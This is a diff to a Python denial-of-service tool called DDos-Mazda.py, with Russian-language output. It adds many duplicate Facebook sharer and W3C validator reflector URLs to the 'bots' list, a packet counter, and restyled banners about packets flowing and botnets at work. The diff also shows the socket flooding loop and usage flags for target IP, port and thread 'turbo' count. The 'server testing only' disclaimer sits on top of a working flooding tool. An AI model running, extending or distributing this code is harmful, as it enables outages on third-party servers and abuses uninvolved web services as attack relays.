@@ -11,7 +11,7 @@ from colorama import init
 init()
 
 
-
+i = 0
 
 def user_agent():
 	global uagent
@@ -101,6 +101,78 @@ def my_bots():
 	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
 	bots.append("http://validator.w3.org/check?uri=")
 	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")	
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")	
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")	
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")	
 	return(bots)
 
 
@@ -122,13 +194,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Пакеты пошли -- Ботнеры в работе --> \033[0m" + str(item))
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- ПаКеТы поШли -- БоТнеРы в рАбоТе --> \033[0m" + str(i))
 			else:
 				s.shutdown(1)
 				print("\033[91m<->\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mНЕт контакта! Сервер не работает ..\033[0m")
+		print("\033[91mНЕт конТакта! СерВер не рабоТает ..\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -176,17 +248,17 @@ def usage():
 		| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - |
 		|                                                                                         |
 		|  ! Ответственность за соблюдение всех применимых законов лежит на конечном пользователе.|
-	        |  Это только для сценария тестирования сервера. Ваш ip-адрес виден!                      |
+	    |  Это только для сценария тестирования сервера. Ваш ip-адрес виден!                      |
 		|	                                                                                  |
 		|                                                                                         |
 		|_________________________________________________________________________________________| 
 
 
-                                                   ---|| ЗАПУСК ||---
+                              ---|| ЗАПУСК ||---
 					  python3 DDos-Mazda.py [- s] [- p] [- t]
-					 -h: помогите/Help
+					 -h: Помогите/Help
 					 -s: IP сервера
-					 -p: порт по умолчанию (80)
+					 -p: Порт по умолчанию (80)
 					 -t: Турбо по умолчанию (135) ''')
 	sys.exit()
 
@@ -234,7 +306,7 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," Порт: ",str(port)," Турбо: ",str(thr),"\033[0m")
+	print("\033[92m",host," -Порт-: ",str(port)," -Турбо-: ",str(thr),"\033[0m")
 	print("\033[94mПожалуйста подождите ..\033[0m")
 	user_agent()
 	my_bots()
@@ -259,9 +331,10 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
-			if (item>1800000000000): # for no memory crash
+			if (item>180000000000000): # for no memory crash
 				item=0
 				time.sleep(.1)
+			i = i + 1 
 			item = item + 1
 			q.put(item)
 			w.put(item)
